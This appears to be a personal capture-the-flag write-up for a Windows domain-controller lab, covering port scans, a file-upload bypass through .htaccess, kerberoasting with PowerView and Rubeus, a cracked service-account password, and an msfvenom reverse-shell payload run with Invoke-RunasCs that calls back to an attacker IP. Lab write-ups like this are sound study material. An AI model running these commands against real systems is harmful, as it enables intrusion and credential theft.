AD Windows ttl=125

# rustscan

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 125
80/tcp    open  http             syn-ack ttl 125
88/tcp    open  kerberos-sec     syn-ack ttl 125
135/tcp   open  msrpc            syn-ack ttl 125
139/tcp   open  netbios-ssn      syn-ack ttl 125
389/tcp   open  ldap             syn-ack ttl 125
445/tcp   open  microsoft-ds     syn-ack ttl 125
464/tcp   open  kpasswd5         syn-ack ttl 125
593/tcp   open  http-rpc-epmap   syn-ack ttl 125
636/tcp   open  ldapssl          syn-ack ttl 125
3268/tcp  open  globalcatLDAP    syn-ack ttl 125
3269/tcp  open  globalcatLDAPssl syn-ack ttl 125
5985/tcp  open  wsman            syn-ack ttl 125
9389/tcp  open  adws             syn-ack ttl 125
49666/tcp open  unknown          syn-ack ttl 125
49668/tcp open  unknown          syn-ack ttl 125
49673/tcp open  unknown          syn-ack ttl 125
49674/tcp open  unknown          syn-ack ttl 125
49677/tcp open  unknown          syn-ack ttl 125
49704/tcp open  unknown          syn-ack ttl 125
```

# nmap

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-15 09:50:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 4 hops
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-15T09:52:44
|_  start_date: N/A
```


# initial

Got so many things and checks smb but nothing and then started dirbuster and look at site

seen upload button in `buy-tickets`

![[Pasted image 20240615161501.png]]

even found `/uploads` directory where files are getting stored

so I tested with `.php` but only image files are allowed, tried to change name and content and files are getting bypass things but nothing gets rendered on screen

I have no clue what `.htaccess` is but now I know!!

### .htaccess

basically config file which checks what to allow and what not

Below are some usage of htaccess files in server:

1) AUTHORIZATION, AUTHENTICATION: .htaccess files are often used to specify the security restrictions for the particular directory, hence the filename "access". The .htaccess file is often accompanied by an .htpasswd file which stores valid usernames and their passwords.

2) CUSTOMIZED ERROR RESPONSES: Changing the page that is shown when a server-side error occurs, for example HTTP 404 Not Found. Example : ErrorDocument 404 /notfound.html

3) REWRITING URLS: Servers often use .htaccess to rewrite "ugly" URLs to shorter and prettier ones.

4) CACHE CONTROL: .htaccess files allow a server to control User agent caching used by web browsers to reduce bandwidth usage, server load, and perceived lag.

![[Pasted image 20240615162233.png]]

https://medium.com/@madhuhack01/insecure-file-upload-basic-bypass-76d1b9197e4c
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

[[htaccess bypass]]

with both tricks

![[Pasted image 20240615162346.png]]

uploaded best shell with `.dork` extension and got shell
# priv esc

![[Pasted image 20240617142419.png]]

next step as it is DC, I do check kerberoasting

### kerberoast

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

![[Pasted image 20240617225538.png]]

```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
```

with this we can get hash directly but it will need much more formatting

![[Pasted image 20240617225643.png]]

it will give hash for krbtgt as well

#### rubeus

```
.\Rubeus.exe kerberoast /nowrap
```

![[Pasted image 20240617225805.png]]

cracking that hash given pass: `trustno1` for `svc_mssql`

### runas

now as we have pass, we should able to run any process with it so we will run cmd and get reverse shell or make shell with msfvenom and run it with that pass and user

#### Invoke-RunasCs.ps1

https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=80 -f exe -o reverse.exe
```

```
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "reverse.exe"
```

![[Pasted image 20240617230548.png]]

### SeManageVolumePrivilege

This is totally new to me!

https://medium.com/@raphaeltzy13/exploiting-semanagevolumeprivilege-with-dll-hijacking-windows-privilege-escalation-1a4f28372d37

![[Pasted image 20240617230731.png]]

[[SeManageVolumePrivilege]]

